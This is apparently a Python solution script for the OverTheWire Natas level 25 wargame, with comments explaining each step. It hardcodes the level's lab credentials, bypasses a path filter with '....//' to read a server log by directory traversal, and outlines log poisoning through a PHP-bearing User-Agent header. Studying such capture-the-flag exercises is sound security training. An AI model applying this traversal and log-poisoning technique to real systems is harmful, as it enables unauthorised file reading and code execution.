import requests
import bs4
import re
import html


# configuration for natas25
USERNAME = 'natas25'
PASSWORD = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
URL = 'http://natas25.natas.labs.overthewire.org/'


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
# print(html.unescape(response.text).replace('<br />', ''))


# first part
"""
function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"] ))
            return 1;
    safeinclude("language/en"); 
}

function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}
"""
# in the source code, there is a safeinclude()
# which give us a hint of the type of the vulnerability
# which is directory traversal because of insufficient
# user input sanitisation
# for example, in this case, we can perform "unsafe string replacement attack"
# reference: https://nets.ec/Unsafe_string_replacement
# since the server will replace every occurence of ../ with "",
# with the input "....//", we can bypass the input sanitisation
# so, when "../" is removed from "....//", we stilll get "../"
# which still allow for directory traversal


"""
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
"""
# since we know the location of the log files based on the source code,
# we can try to read the log files with the help of the directory traversal
# attack
print(session.cookies.get_dict())
PHPSESSID = session.cookies.get_dict().get('PHPSESSID')
# since the string "language/" will be prepended to the string that we submitted to the webserver,
# we need to go to the parent directory and then go to the logs directory to access the log files
logs_location = f'....//logs/natas25_{PHPSESSID}.log'
params = {
    "lang" : logs_location
}
response = session.get(URL, params=params)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# for the second part of the attack, 
# now that we have access to the log file,
# it seems that we also have control over the log file as
# our HTTP USER AGENT will be logged into the log file.
# so, what we can do is to modify the HTTP USER AGENT header 
# to contain PHP code and let the webserver executes it when 
# it loads the log file and sends it to our browser